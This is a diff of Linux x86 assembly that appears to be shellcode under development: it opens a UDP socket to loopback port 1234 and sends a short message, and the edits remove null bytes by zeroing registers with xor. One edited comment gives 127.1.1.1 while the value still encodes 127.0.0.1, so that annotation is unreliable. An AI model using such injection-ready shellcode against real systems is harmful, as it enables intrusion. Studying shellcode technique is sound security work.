@@ -11,9 +11,9 @@
 %define htons(x) ((x >> 8) & 0xFF) | ((x & 0xFF) << 8)
 %define _port 1234              ; port  
 PORT equ htons(_port)           ; 
-_ip equ 0x0100007F		; loopback - 127.0.0.1
+_ip equ 0x0100007F		; loopback - 127.1.1.1
 
-BUFLEN equ 1024; will read only 1024 bytes from UDP =) 
+;BUFLEN equ 1024; will read only 1024 bytes from UDP =) 
 
 global _start 
 
@@ -21,9 +21,9 @@ _start:
 
 
 ; we create a socket fd, using again syscall 0x66 and argument SYS_SOCKET so ebx = 1  
-push   0x66 
-pop    eax    
-push   0x1  
+push   0x66
+pop    eax
+push   0x1 
 pop    ebx
 xor    ecx,ecx
 push   ecx
@@ -48,6 +48,7 @@ push   eax
 mov    ecx,esp
 ; we save fd received by socket creation, which is still in eax, before using the register   
 mov    esi,eax
+xor eax,eax 
 mov    al,0x66  
 add    bl,0x2   
 int    0x80
@@ -61,7 +62,8 @@ push 0x0a3a7964
 push 0x72706475  
 mov edx,esp
 ; no flags needed 
-push 0x0 
+xor ecx,ecx
+push ecx
 ; size of message to be sent is 8 
 push 0x8 
 push edx 
